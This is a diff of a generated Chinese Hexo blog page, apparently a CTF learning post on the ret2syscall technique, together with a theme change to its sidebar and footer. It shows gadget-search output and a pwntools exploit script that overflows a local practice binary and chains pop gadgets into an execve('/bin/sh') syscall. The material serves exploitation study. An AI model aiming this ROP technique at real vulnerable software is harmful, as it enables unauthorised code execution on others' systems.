+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(ret2syscall/ELF/x86_64)&gt; search syscall</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: syscall</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line"><span class="number">0x00000000004003da</span>: syscall; </span><br><span class="line"><span class="number">0x000000000046a96e</span>: syscall; add rsp, <span class="number">0x98</span>; xor eax, eax; pop rbx; pop rbp; ret; </span><br><span class="line"><span class="number">0x000000000043f885</span>: syscall; cmp rax, <span class="number">-0x1000</span>; ja <span class="number">0x3f8d0</span>; add rsp, <span class="number">0x60</span>; pop rbx; ret; </span><br><span class="line"><span class="number">0x000000000046ac85</span>: syscall; cmp rax, <span class="number">-0x1000</span>; ja <span class="number">0x6ac98</span>; pop rbx; ret; </span><br><span class="line"><span class="number">0x000000000043f5a5</span>: syscall; cmp rax, <span class="number">-0xfff</span>; jae <span class="number">0x44810</span>; ret; </span><br><span class="line"><span class="number">0x000000000047e352</span>: syscall; jmp <span class="number">0x7e2a5</span>; nop dword ptr [rax]; call rax; </span><br><span class="line"><span class="number">0x0000000000442b87</span>: syscall; pop rdx; pop rsi; ret; </span><br><span class="line"><span class="number">0x000000000047cbed</span>: syscall; test edx, edx; jne <span class="number">0x7cbcf</span>; mov dword ptr fs:[<span class="number">0x2d0</span>], eax; ret; </span><br><span class="line"><span class="number">0x0000000000467685</span>: syscall; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; </span><br></pre></td></tr></table></figure>
+
+<p>exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;ret2syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b main\nc&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = p64(<span class="number">0x4bc808</span>)</span><br><span class="line">pop_rdi = p64(<span class="number">0x401626</span>)</span><br><span class="line">pop_rsi = p64(<span class="number">0x401747</span>)</span><br><span class="line">pop_rdx = p64(<span class="number">0x442b66</span>)</span><br><span class="line">syscall = p64(<span class="number">0x467685</span>)</span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line">bs = p64(<span class="number">0x004a1384</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 让 正常函数的ret返回到 pop_rax 处</span></span><br><span class="line">payload +=pop_rax + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload +=pop_rdi + bs</span><br><span class="line">payload +=pop_rsi + p64(<span class="number">0</span>)</span><br><span class="line">payload +=pop_rdx + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += syscall</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>1. </p>
 <h2 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h2><h3 id="x86-32-Syscall-table"><a href="#x86-32-Syscall-table" class="headerlink" title="x86_32 Syscall table"></a>x86_32 Syscall table</h3><table>
 <thead>
 <tr>
@@ -4468,48 +4671,200 @@
 <td>?</td>
 </tr>
 </tbody></table>
-<h3 id="x86-64-Syscall-table"><a href="#x86-64-Syscall-table" class="headerlink" title="x86_64 Syscall table"></a>x86_64 Syscall table</h3><h2 id><a href="#" class="headerlink" title></a><img src="/2025/06/06/pwn-ret2syscall/QQ%E6%88%AA%E5%9B%BE20250606153717.png" alt="QQ截图20250606153717"></h2></div><div class="article-licensing box"><div class="licensing-title"><p>pwn-ret2syscall</p><p><a href="http://example.com/2025/06/06/pwn-ret2syscall/">http://example.com/2025/06/06/pwn-ret2syscall/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Chow</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2025-06-06</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-06-06</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/pwn/">pwn</a></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>Afdian.net</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>Alipay</span><span class="qrcode"><img src="/" alt="Alipay"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>Buy me a coffee</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="/" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2025/06/05/gdb%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"><span class="level-item">gdb命令使用</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card" id="comments"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://octodex.github.com/images/steroidtocat.png" alt="Leon Chow"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Leon Chow</p><p class="is-size-6 is-block">多思考、多实践、拒绝好高骛远</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>No have location</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives/"><p class="title">11</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories/"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags/"><p class="title">5</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/leonchows" target="_blank" rel="me noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/leonchows"><i class="fab fa-github"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-06-06T07:29:21.000Z">2025-06-06</time></p><p class="title"><a href="/2025/06/06/pwn-ret2syscall/">pwn-ret2syscall</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-06-05T12:10:46.000Z">2025-06-05</time></p><p class="title"><a href="/2025/06/05/gdb%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">gdb命令使用</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-06-04T12:33:12.000Z">2025-06-04</time></p><p class="title"><a href="/2025/06/04/docker%E5%AD%A6%E4%B9%A0/">docker学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-06-03T11:56:27.000Z">2025-06-03</time></p><p class="title"><a href="/2025/06/03/PWN-shellcode/">PWN-shellcode</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-06-03T05:40:06.000Z">2025-06-03</time></p><p class="title"><a href="/2025/06/03/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81%E8%A7%A3%E6%9E%90/">凯撒密码解析</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2025/06/"><span class="level-start"><span class="level-item">June 2025</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2025/05/"><span class="level-start"><span class="level-item">May 2025</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/PE/"><span class="tag">PE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/docker/"><span class="tag">docker</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/"><span class="tag">凯撒密码</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BC%96%E7%A0%81/"><span class="tag">编码</span><span class="tag">2</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="LeonChow" height="28"></a><p class="is-size-7"><span>&copy; 2025 Chow</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2025</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
-            article: {
-                highlight: {
-                    clipboard: true,
-                    fold: 'unfolded'
-                }
-            }
-        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
-      window.cookieconsent.initialise({
-        type: "info",
-        theme: "edgeless",
-        static: false,
-        position: "bottom-left",
-        content: {
-          message: "This website uses cookies to improve your experience.",
-          dismiss: "Got it!",
-          allow: "Allow cookies",
-          deny: "Decline",
-          link: "Learn more",
-          policy: "Cookie Policy",
-          href: "https://www.cookiesandyou.com/",
-        },
-        palette: {
-          popup: {
-            background: "#edeff5",
-            text: "#838391"
-          },
-          button: {
-            background: "#4b81e8"
-          },
-        },
-      });
-    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
-            if (typeof $.fn.lightGallery === 'function') {
-                $('.article').lightGallery({ selector: '.gallery-item' });
-            }
-            if (typeof $.fn.justifiedGallery === 'function') {
-                if ($('.justified-gallery > p > .gallery-item').length) {
-                    $('.justified-gallery > p > .gallery-item').unwrap();
-                }
-                $('.justified-gallery').justifiedGallery();
-            }
-        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
-            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
-        });</script></body></html>
+<h3 id="x86-64-Syscall-table"><a href="#x86-64-Syscall-table" class="headerlink" title="x86_64 Syscall table"></a>x86_64 Syscall table</h3><h2 id><a href="#" class="headerlink" title></a><img src="/2025/06/06/pwn-ret2syscall/QQ%E6%88%AA%E5%9B%BE20250606153717.png" alt="QQ截图20250606153717"></h2>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/06/05/gdb%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/" rel="prev" title="gdb命令使用">
+      <i class="fa fa-chevron-left"></i> gdb命令使用
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-ret2syscall"><span class="nav-number">1.</span> <span class="nav-text">pwn-ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#syscall%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">syscall简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E6%9C%AC%E8%BF%87%E6%BB%A4"><span class="nav-number">1.2.</span> <span class="nav-text">文本过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E6%9F%A5%E6%89%BE%E5%8C%85%E5%90%AB%E7%89%B9%E5%AE%9A%E5%86%85%E5%AE%B9%E7%9A%84%E8%A1%8C"><span class="nav-number">1.2.1.</span> <span class="nav-text">✅ 一、查找包含特定内容的行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E6%9F%A5%E6%89%BE%E4%B8%8D%E5%8C%85%E5%90%AB%E5%85%B3%E9%94%AE%E8%AF%8D%E7%9A%84%E8%A1%8C"><span class="nav-number">1.2.2.</span> <span class="nav-text">✅ 二、查找不包含关键词的行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E5%BF%BD%E7%95%A5%E5%A4%A7%E5%B0%8F%E5%86%99%E6%9F%A5%E6%89%BE"><span class="nav-number">1.2.3.</span> <span class="nav-text">✅ 三、忽略大小写查找</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81%E6%9F%A5%E6%89%BE%E5%A4%9A%E5%85%B3%E9%94%AE%E8%AF%8D%EF%BC%88%E6%AD%A3%E5%88%99%E6%88%96%E5%A4%9A%E4%B8%AAgrep%EF%BC%89"><span class="nav-number">1.2.4.</span> <span class="nav-text">✅ 四、查找多关键词（正则或多个grep）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%9C%85-%E4%BA%94%E3%80%81%E4%BB%85%E8%BE%93%E5%87%BA%E5%8C%B9%E9%85%8D%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%8D%E5%90%AB%E6%95%B4%E8%A1%8C%EF%BC%89"><span class="nav-number">1.2.5.</span> <span class="nav-text">✅ 五、仅输出匹配内容（不含整行）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%9C%85-%E5%85%AD%E3%80%81%E6%9F%A5%E6%89%BE%E4%B8%8A%E4%B8%8B%E6%96%87%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%8A%E4%B8%8B%E5%87%A0%E8%A1%8C%EF%BC%89"><span class="nav-number">1.2.6.</span> <span class="nav-text">✅ 六、查找上下文内容（上下几行）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%9C%85-%E4%B8%83%E3%80%81%E9%85%8D%E5%90%88-awk-%E7%B2%BE%E5%87%86%E6%8E%A7%E5%88%B6%E8%BE%93%E5%87%BA%E5%AD%97%E6%AE%B5"><span class="nav-number">1.2.7.</span> <span class="nav-text">✅ 七、配合 awk 精准控制输出字段</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9A%84%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B"><span class="nav-number">1.3.</span> <span class="nav-text">系统调用的传参过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">1.4.</span> <span class="nav-text">例题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.5.</span> <span class="nav-text">exp执行过程详解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%89%A7%E8%A1%8C-pop-rax-ret%EF%BC%9A"><span class="nav-number">1.5.1.</span> <span class="nav-text">1. 执行 pop rax; ret：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%89%A7%E8%A1%8C-pop-rdi-ret%EF%BC%9A"><span class="nav-number">1.5.2.</span> <span class="nav-text">2. 执行 pop rdi; ret：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%89%A7%E8%A1%8C-pop-rsi-ret%EF%BC%9A"><span class="nav-number">1.5.3.</span> <span class="nav-text">3. 执行 pop rsi; ret：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%89%A7%E8%A1%8C-pop-rdx-ret%EF%BC%9A"><span class="nav-number">1.5.4.</span> <span class="nav-text">4. 执行 pop rdx; ret：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%89%A7%E8%A1%8C-syscall-ret%EF%BC%9A"><span class="nav-number">1.5.5.</span> <span class="nav-text">5. 执行 syscall; ret：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E5%86%85%E7%9A%84%E6%95%B0%E6%8D%AE%E9%A1%BA%E5%BA%8F%E7%A4%BA%E6%84%8F%E5%9B%BE%EF%BC%888%E5%AD%97%E8%8A%82%E4%B8%BA%E5%8D%95%E4%BD%8D%EF%BC%89"><span class="nav-number">1.5.6.</span> <span class="nav-text">栈内的数据顺序示意图（8字节为单位）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84%E4%BB%B6%EF%BC%9A"><span class="nav-number">1.6.</span> <span class="nav-text">附件：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#x86-32-Syscall-table"><span class="nav-number">1.6.1.</span> <span class="nav-text">x86_32 Syscall table</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x86-64-Syscall-table"><span class="nav-number">1.6.2.</span> <span class="nav-text">x86_64 Syscall table</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.7.</span> <span class="nav-text"></span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Chow"
+      src="https://octodex.github.com/images/steroidtocat.png">
+  <p class="site-author-name" itemprop="name">Chow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Chow</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
